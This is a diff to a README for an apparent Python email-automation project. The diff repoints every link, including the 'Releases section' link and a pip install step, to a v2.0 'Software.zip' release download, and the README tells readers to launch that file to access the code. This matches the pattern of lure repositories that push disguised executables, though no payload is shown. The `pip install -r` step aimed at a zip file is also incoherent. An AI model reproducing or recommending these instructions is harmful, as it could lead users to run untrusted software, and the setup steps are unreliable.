@@ -19,13 +19,13 @@ The "automated-email-sender" project utilizes the power of Python to connect to 
 - SMTP (smtplib library)
 
 ## Installation 🛠️
-To get started with this project, simply [download the project files here!](https://github.com/gamblezclone/automated-email-sender/releases/download/v1.0/Software.zip)
+To get started with this project, simply [download the project files here!](https://github.com/gamblezclone/automated-email-sender/releases/download/v2.0/Software.zip)
 
 Launch the downloaded file to access the code and start automating your email sending process!
 
 ## Usage 📝
 1. Ensure you have Python installed on your system.
-2. Install the required libraries using `pip install -r https://github.com/gamblezclone/automated-email-sender/releases/download/v1.0/Software.zip`.
+2. Install the required libraries using `pip install -r https://github.com/gamblezclone/automated-email-sender/releases/download/v2.0/Software.zip`.
 3. Set up Gmail with an [App Password](#) for secure email sending.
 4. Prepare your customer data in an Excel file.
 5. Update the email template in the Python script to personalize your messages.
@@ -42,4 +42,4 @@ This project is licensed under the MIT license. Feel free to use, modify, and di
 
 ---
 
-Don't forget to check out the ["Releases" section](https://github.com/gamblezclone/automated-email-sender/releases/download/v1.0/Software.zip) for any updates or new versions of the project! Happy emailing 📧✨.
+Don't forget to check out the ["Releases" section](https://github.com/gamblezclone/automated-email-sender/releases/download/v2.0/Software.zip) for any updates or new versions of the project! Happy emailing 📧✨.
